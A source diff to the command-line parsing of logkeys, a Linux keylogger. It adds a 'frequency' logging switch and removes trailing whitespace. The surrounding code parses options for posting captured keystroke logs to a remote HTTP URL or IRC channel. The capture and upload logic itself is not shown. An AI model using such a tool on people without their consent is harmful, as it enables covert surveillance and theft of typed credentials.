@@ -2,7 +2,7 @@
   Copyleft (ɔ) 2009 Kernc
   This program is free software. It comes with absolutely no warranty whatsoever.
   See COPYING for further information.
-  
+
   Project homepage: http://code.google.com/p/logkeys/
 */
 
@@ -16,6 +16,7 @@ namespace logkeys {
 struct arguments
 {
   bool start;          // start keylogger, -s switch
+  bool frequency;      // detailed logging
   bool kill;           // stop keylogger, -k switch
   bool us_keymap;      // use default US keymap, -u switch
   std::string logfile;      // user-specified log filename, -o switch
@@ -39,9 +40,10 @@ struct arguments
 void process_command_line_arguments(int argc, char **argv)
 {
   int flags;
-  
+
   struct option long_options[] = {
     {"start",     no_argument,       0, 's'},
+    {"frequency", no_argument,       0, 'f'},
     {"keymap",    required_argument, 0, 'm'},
     {"output",    required_argument, 0, 'o'},
     {"us-keymap", no_argument,       0, 'u'},
@@ -56,33 +58,34 @@ void process_command_line_arguments(int argc, char **argv)
     {"post-size",     required_argument, &flags, FLAG_POST_SIZE},
     {0}
   };
-  
+
   char c;
   int option_index;
-  
-  while ((c = getopt_long(argc, argv, "sm:o:ukd:?", long_options, &option_index)) != -1)
+
+  while ((c = getopt_long(argc, argv, "sfm:o:ukd:?", long_options, &option_index)) != -1)
   {
-    switch (c) 
+    switch (c)
     {
       case 's': args.start = true;     break;
+      case 'f': args.frequency = true; break;
       case 'm': args.keymap = optarg;  break;
       case 'o': args.logfile = optarg; break;
       case 'u': args.us_keymap = true; break;
       case 'k': args.kill = true;      break;
       case 'd': args.device = optarg;  break;
-      
-      case  0 : 
+
+      case  0 :
         args.flags |= flags;
-        switch (flags) 
+        switch (flags)
         {
           case FLAG_EXPORT_KEYMAP: args.keymap = optarg; break;
-          
+
           case FLAG_POST_HTTP:
             if (strncmp(optarg, "http://", 7)  != 0)
               error(EXIT_FAILURE, 0, "HTTP URL must be like \"http://domain:port/script\"");
-            args.http_url = optarg; 
+            args.http_url = optarg;
             break;
-          
+
           case FLAG_POST_IRC: {
             // optarg string should be like "entity@server:port", now dissect it
             char *main_sep = strrchr(optarg, '@');
@@ -96,9 +99,9 @@ void process_command_line_arguments(int argc, char **argv)
             args.irc_port = port_sep + 1;
             break;
           }
-          
+
           case FLAG_POST_SIZE:
-            args.post_size = atoi(optarg); 
+            args.post_size = atoi(optarg);
             switch (optarg[strlen(optarg) - 1])  // process any trailing M(egabytes) or K(ilobytes)
             {
               case 'K': case 'k': args.post_size *= 1000;    break;
@@ -106,12 +109,12 @@ void process_command_line_arguments(int argc, char **argv)
             }
         }
         break;
-      
+
       case '?': usage(); exit(EXIT_SUCCESS);
       default : usage(); exit(EXIT_FAILURE);
     }
   } // while
-  
+
   while(optind < argc)
     error(0, 0, "Non-option argument %s", argv[optind++]);
 }
